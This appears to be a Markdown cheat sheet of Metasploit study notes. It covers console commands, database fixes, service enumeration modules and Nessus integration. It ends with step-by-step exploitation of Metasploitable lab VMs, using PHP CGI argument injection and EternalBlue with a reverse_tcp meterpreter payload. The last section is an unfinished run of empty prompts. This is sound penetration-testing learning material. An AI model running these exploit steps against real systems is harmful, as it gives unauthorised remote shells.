# Metasploit framework

# Contents
	MSF console usage
		Key switches (use msfconsole -h for full help)
		Modules
		MSF Basic Commands
			Core commands
			Selected other commands
		MSF Databases
			Database issues
				Fixing the collation warning/error
				Fixing the “SCRAM authentication requires libpq version 10 or above” error
			Default usage
				From terminal
				From msfconsole
			New database
				New user and database
				From msfconsole
			File formats currently supported by db_import
	Enumeration
		nmap integration
			Directly from msfconsole (module)
			Directly from msfconsole (built in nmap)
			Importing scans
		SMB and samba
			Search services and all modules
			Common modules
		MySql
			Search services and all modules
			Common modules
		FTP
			Search services and all modules
			Common modules
		SSH
			Search services and all modules
			Common modules
		HTTP
			Search services and all modules
			Common modules
		SNMP
			Search services and all modules
			Common modules
		SMTP
			Search services and all modules
			Common modules
		Shodan with metasploit
			Search modules
			Common modules
	Nessus integration
		From external file
		Nessus plugin
	Selected exploits/gaining access
		Metasploitable 2 (linux - port 80): PHP CGI Argument Injection
		Metasploitable 3 (windows): MS17-010 EternalBlue SMB remote Windows Kernel Pool Corruption
		( - port 1617): Java JMX Server Insecure Configuration Java Code Execution (java_jmx_server)

----------

## MSF console usage
### Key switches (use msfconsole -h for full help)
1. msfconsole -q # quiet, no banner
2. msfconsole -r # use specified resource file (runcontrol)
3. msfconsole -x # execute specified console command (use ';' for command sequence)
3. msfconsole -H FILE # save command history to FILE
3. msfconsole -o FILE # output payload to FILE
3. msfconsole -m PATH # load additional module path  

### Directory structure (MSF6 on Kali)
- /opt/metasploit-framework/embedded/framework/ # executables, e.g. msfconsole
- /opt/metasploit-framework/embedded/framework/modules # all modules
- /opt/metasploit-framework/embedded/framework/data # e.g. for wordlists
- /opt/metasploit-framework/embedded/framework/documentation # including developers_ guide.pdf 

### Modules
- auxiliary
- encoders
- evasion
- exploits
- nops
- payloads
- post

### MSF Basic Commands
#### Core commands
- ? or help # top level commands 
- help <command_name> # command specific help
- color # enable or disable color
- version
- pwd/ifconfig/cd etc # drops unrecognised commands onto the shell
- search <key_word>:<search_term> # see help search for key words
- search <key_word>:<search_term> | grep <additional_search_term>
- history # displays command history
- spool <file> # outputs history to <file>
- save # saves current config
- use # use an exploit
- show payloads # lists payloads for current exploit
- set PAYLOAD <payload> 
- back # unloads current module

#### Selected other commands
- show <param> # use help show for params
- info # with exploit/payload/any module loaded
- show options
- show missing
- show advanced # can change with the following
	- show targets
	- show evasion
- set/setg/get/getg/unset/unsetg # set exploit/payload options
- run/exploit/exploit -j
- sessions # lists available
- sessions -i <id> # interact with session <id>
- pushm/popm # pushes/pops the current module to stack, i.e. doesn't unload it, maintains the currently set options
- listm # lists the current module stack
- previous # loads the last module to be used

### MSF Databases
#### Database issues
##### Fixing the collation warning/error

    # taking backups is always a good idea :-)
    root@kali:~> su postgres
    su@kali:~> pg_dump msf > msf_backup.sql
    su@kali:~> pg_dump msf_test > msf_test_backup.sql
    
    su@kali:~> psql -l # check for templates, both of the following may not be required
    
    su@kali:~> psql -d template0 -c "ALTER DATABASE template0 REFRESH COLLATION VERSION;"
    
    su@kali:~> psql -d template1 -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
    
    su@kali:~> psql -d postgres -c "ALTER DATABASE postgres REFRESH COLLATION VERSION;"

    su@kali:~> psql -d msf -c "ALTER DATABASE msf REFRESH COLLATION VERSION;"

##### Fixing the “SCRAM authentication requires libpq version 10 or above” error

- Metasploit ships with an obsolete libpq.so (C library for connecting to postgresql) distribution
- These libraries reside in /opt/metasploit-framework/embedded/lib
- The correct versions reside in /usr/lib/x86_64-linux-gnu/
- Remove or back up libpq.a, libpq.so, libpq.so.5, libpq.so.5.0
- Copy in libpq.so.5 and libpq.so.5.16

To fix:

	# Make sure that postgresql is latest version (v 16.X at the time of writing)
	systemctl stop postgresql	
	apt-get remove postgresql
	apt-get update
	apt-get install postgresql
	# Remove the old libraries (you might see libpq.so.5.9.*) and replace with the new (you should see libpq.so.5.16.*)
    cd /opt/metasploit-framework/embedded/lib
    rm libpq.*
    cp /usr/lib/x86_64-linux-gnu/libpq.so.5
    cp /usr/lib/x86_64-linux-gnu/libpq.so.5.16

#### Default usage
##### From terminal:

    root@kali:~> msfdb # displays help
    root@kali:~> msfdb delete
    root@kali:~> msfdb init
    root@kali:~> msfconsole -q

##### From msfconsole:

    msf6> db_status
    msf6> help database # shows available commands
    msf6> workspace -h # workspace commands
    msf6> workspace # lists available workspaces
    msf6> workspace -v # verbose list of available workspaces
    msf6> workspace -a <workspace_name> # adds a new workspace
    msf6> workspace <workspace_name> # switch to <workspace_name>

#### New database
##### New user and database:

    root@kali:~> systemctl stop postgresql
    root@kali:~> systemctl start postgresql
    root@kali:~> cat /etc/passwd | grep postgres # check that user exists
    root@kali:~> su postgres # default installation has no password
    su@kali:~> psql -l
    su@kali:~> createuser <new_user> -P # then enter new password
    su@kali:~> createdb <new_database> --owner=<new_user>
    su@kali:~> psql -l # check that new database has been installed

##### From msfconsole:

    msf6> db_status
    msf6> db_disconnect
    msf6> db_connect <new_user>:password@localhost:5432/<new_database>
    msf6> db_status

    # Change /opt/metasploit-framework/config/database.yml to connect automatically

#### File formats currently supported by db_import
    Acunetix
    Amap Log
    Amap Log -m
    Appscan
    Burp Session XML
    Burp Issue XML
    CI
    Foundstone
    FusionVM XML
    Group Policy Preferences Credentials
    IP Address List
    IP360 ASPL
    IP360 XML v3
    Libpcap Packet Capture
    Masscan XML
    Metasploit PWDump Export
    Metasploit XML
    Metasploit Zip Export
    Microsoft Baseline Security Analyzer
    NeXpose Simple XML
    NeXpose XML Report
    Nessus NBE Report
    Nessus XML (v1)
    Nessus XML (v2)
    NetSparker XML
    Nikto XML
    Nmap XML
    OpenVAS Report
    OpenVAS XML
    Outpost24 XML
    Qualys Asset XML
    Qualys Scan XML
    Retina XML
    Spiceworks CSV Export
    Wapiti XML

## Enumeration
### nmap integration
#### Directly from msfconsole (module)
    search name:portscan type:auxiliary

#### Directly from msfconsole (built in nmap)
    db_nmap -v -sSU -A -Pn --top-ports 100 192.168.4.1/24

#### Importing scans
    db_import nmap.xml

### SMB and samba
#### Search services and all modules
    services -S smb -u
    search name:smb type:auxiliary

#### Common modules
    use auxiliary/scanner/smb/smb_version
    use auxiliary/scanner/smb/smb_login
    use auxiliary/scanner/smb/smb_ms17_010 # eternal blue detection
    use auxiliary/admin/smb/list_directory
    use auxiliary/scanner/smb/smb_enumshares 
    use auxiliary/scanner/smb/smb_enumusers

    See also (exploits):
    	use exploit/windows/smb/ms17_010_psexec
    	use exploit/windows/smb/ms17_010_eternalblue
    	use exploit/windows/smb/psexec

### MySql
#### Search services and all modules
    services -S mysql -u
    search name:mysql type:auxiliary

#### Common modules
    use auxiliary/scanner/mysql/mysql_login
    use auxiliary/admin/mysql/mysql_sql
    use auxiliary/scanner/mysql/mysql_version

### FTP
#### Search services and all modules
    services -S ftp -u
    search name:ftp type:auxiliary

#### Common modules
    use auxiliary/scanner/ftp/ftp_version
    use auxiliary/scanner/ftp/anonymous
    use auxiliary/ftp/ftp_login

### SSH
#### Search services and all modules
    services -S ssh -u
    search name:ssh type:auxiliary

#### Common modules
    use auxiliary/scanner/ssh/ssh_version
    use auxiliary/scanner/ssh/ssh_login
    use auxiliary/scanner/ssh/ssh_enumusers 

### HTTP
#### Search services and all modules
    services -S http -u
    services -S ssl -u
    search name:http type:auxiliary

#### Common modules
    use auxiliary/scanner/http/http_version
    use auxiliary/scanner/http/http_header
    use auxiliary/scanner/http/options
    use auxiliary/scanner/http/robots.txt
    use auxiliary/scanner/http/title
    use auxiliary/scanner/http/ssl
    use auxiliary/scanner/http/ssl_version
    use auxiliary/scanner/http/cert
    use auxiliary/scanner/http/http_put
    use auxiliary/scanner/http/trace
    use auxiliary/scanner/http/dir_listing
    use auxiliary/scanner/http/http_traversal
    use auxiliary/scanner/http/crawler
    use auxiliary/scanner/http/dir_scanner
    use auxiliary/scanner/http/backup_file
    use auxiliary/scanner/http/http_login

### SNMP
#### Search services and all modules
    services -S snmp -u
    search name:snmp type:auxiliary

#### Common modules
    use auxiliary/scanner/snmp/snmp_enum

### SMTP
#### Search services and all modules
    services -S smtp -u
    search name:smtp type:auxiliary

#### Common modules
    use auxiliary/scanner/smtp/smtp_version
    use auxiliary/scanner/smtp/smtp_enum

### Shodan with metasploit
#### Search modules   
    search name:shodan type:auxiliary

#### Common modules
    use auxiliary/gather/shodan_search # set SHODAN_APIKEY *************************

## Nessus integration
### From external file
    db_import <nessus file>

### Nessus plugin
    msf6 > load nessus
    msf6 > nessus_help
    msf6 > nessus_connect <uid>:<pwd>@192.168.4.23:8834 ssl_ignore
    msf6 > nessus_policy_list
    Policy ID  Name  Policy UUID
    ---------  ----  -----------
    15 discworld_network_01  ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66

    msf6 > nessus_scan_new ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66 scanFromMsf "Scan from metasploit framework" 192.168.4.1/24
    msf6 > nessus_scan_launch <scan number>
    msf6 > nessus_scan_stop <scan number>
    msf6 > nessus_scan_list
    Scan ID  Name  Owner Started  Status Folder
    -------  ----  ----- -------  ------ ------
    5Discworld Network 01  dgolding   empty  2
    8Discworld Network 01  dgolding   completed  2
    12   discworld_network_01  dgolding   completed  3

    msf6 > nessus_db_import <scan id>

## Selected exploits/gaining access
msf6 > 
### Metasploitable 2 (linux - port 80): PHP CGI Argument Injection
    msf6 > search cve:2012-1823
    
    Matching Modules
    ================
    
       #  Name  Disclosure Date  Rank   Check  Description
       -  ----  ---------------  ----   -----  -----------
       0  exploit/multi/http/php_cgi_arg_injection  2012-05-03   excellent  YesPHP CGI Argument Injection
    
    
    Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/php_cgi_arg_injection
    
    msf6 > use 0
    msf6 > set RHOSTS 192.168.4.32
    msf6 > exploit 

    meterpreter > 

### Metasploitable 3 (windows): MS17-010 EternalBlue SMB remote Windows Kernel Pool Corruption
    msf6 > vulns -S ms17-010
    msf6 > vulns -S ms17-010 192.168.4.36
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
    msf6 > set RHOSTS 192.168.4.36
    msf6 > run
    
    meterpreter >

    msf6 > use exploit/windows/smb/ms17_010_psexec
    msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
    msf6 > set RHOSTS 192.168.4.36
    msf6 > set SMBDomain <domain>
    msf6 > set SMBUser <user>
    msf6 > set SMBPass <password>
    msf6 > run
    
    meterpreter >

### ( - port 1617): Java JMX Server Insecure Configuration Java Code Execution (java_jmx_server)
msf6 >
msf6 >
msf6 >
msf6 >
msf6 >
msf6 >
msf6 >
msf6 >
msf6 >
msf6 >
